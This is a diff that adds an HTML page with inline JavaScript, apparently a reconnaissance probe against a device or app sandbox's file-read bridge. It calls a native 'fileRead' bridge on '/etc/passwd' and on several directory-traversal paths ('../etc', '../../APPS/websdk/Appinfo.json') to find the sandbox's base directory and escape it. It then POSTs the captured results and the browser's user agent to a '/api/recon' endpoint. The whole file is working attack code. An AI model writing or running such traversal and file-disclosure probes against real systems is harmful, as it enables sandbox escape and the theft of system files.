@@ -1,0 +1,38 @@
+<!doctype html>
+<!-- recon follow-up: capture file bridge ERROR objects raw (JSON.stringify),
+     and pin down the sandbox base depth. Read-only. -->
+<html><head><meta charset="utf-8"><title>recon-err</title></head>
+<body><pre id="out">errno probes…</pre><script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var report = { started: new Date().toISOString(), ua: navigator.userAgent, errs: {} };
+  function save(tag) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
+    } catch (e) {}
+  }
+  function raw(path, mode) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: (mode || 6) });
+      // capture the object as-is, no string coercion
+      return { ret: r.ret, retType: typeof r.ret, msg: r.msg, msgType: typeof r.msg };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  // base-depth discovery + errno capture
+  report.errs.abs_passwd        = raw("/etc/passwd");
+  report.errs.abs_missing       = raw("/zzz-not-here");
+  report.errs.rel_missing       = raw("zzz-not-here.txt");
+  report.errs.dir_websdk_prefix = raw("../etc");          // directory via traversal
+  report.errs.dir_websdk_plain  = raw("./");
+  report.errs.appinfo_no_websdk = raw("Appinfo.json");    // is base /APPS/websdk already?
+  report.errs.websdk_via_trav   = raw("../APPS/websdk/Appinfo.json");
+  report.errs.one_up_list       = raw("../websdk/Appinfo.json");
+  report.errs.root_list         = raw("../../APPS/websdk/Appinfo.json");
+  try { out.textContent = JSON.stringify(report, null, 1); } catch (e) {}
+  save("errs"); setTimeout(function () { save("errs-end"); }, 1200);
+})();
+</script></body></html>
